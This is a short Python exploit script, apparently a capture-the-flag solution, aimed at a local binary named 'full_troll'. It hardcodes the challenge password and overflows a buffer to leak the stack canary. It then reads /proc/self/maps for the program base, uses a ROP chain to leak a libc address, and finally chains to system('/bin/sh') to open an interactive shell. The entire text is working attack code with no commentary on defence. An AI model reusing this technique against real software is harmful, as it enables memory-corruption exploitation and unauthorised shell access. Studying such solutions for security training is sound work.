from ptrlib import *

password = 'VibEv7xCXyK8AjPPRjwtp9X'

libc = ELF("./libc.so.6")
elf = ELF("./full_troll")
sock = Process("./full_troll")

# leak canary
payload  = b'A' * 0x20 # password
payload += b'B' * 0x29 # filename + lsb of canary
sock.sendlineafter("password.\n", payload)
sock.sendlineafter("password.\n", password)
sock.recvuntil("Unable to open ")
canary = u64(b'\x00' + sock.recvline()[0x29:0x30])
logger.info('canary = ' + hex(canary))
assert canary > 0x100000000000000

# leak proc base
payload  = b'A' * 0x20
payload += b'/proc/self/maps\x00'
sock.sendlineafter("password.\n", payload)
sock.sendlineafter("password.\n", password)
proc_base = int(sock.recvline()[:12], 16)
logger.info('proc = ' + hex(proc_base))

# leak libc base
payload  = b'A' * 0x20
payload += b'\x00' * 0x28
payload += p64(canary)
payload += p64(0xdeadbeef)
payload += p64(proc_base + 0x000010a3)
payload += p64(proc_base + elf.got('puts'))
payload += p64(proc_base + elf.plt('puts'))
payload += p64(proc_base + 0xead)
sock.sendlineafter("password.\n", payload)
sock.sendlineafter("password.\n", password)
sock.recvuntil("error")
libc_base = u64(sock.recvline()) - libc.symbol('puts')
logger.info('libc = ' + hex(libc_base))

# get the shell
payload  = b'A' * 0x20
payload += b'\x00' * 0x28
payload += p64(canary)
payload += p64(0)
payload += p64(proc_base + 0x000010a4)
payload += p64(proc_base + 0x000010a3)
payload += p64(libc_base + next(libc.find('/bin/sh\x00')))
payload += p64(libc_base + libc.symbol('system'))
assert b'\n' not in payload and b'\xff' not in payload
sock.sendlineafter("password.\n", payload)
sock.sendlineafter("password.\n", password)
sock.recvuntil("error")

sock.interactive()
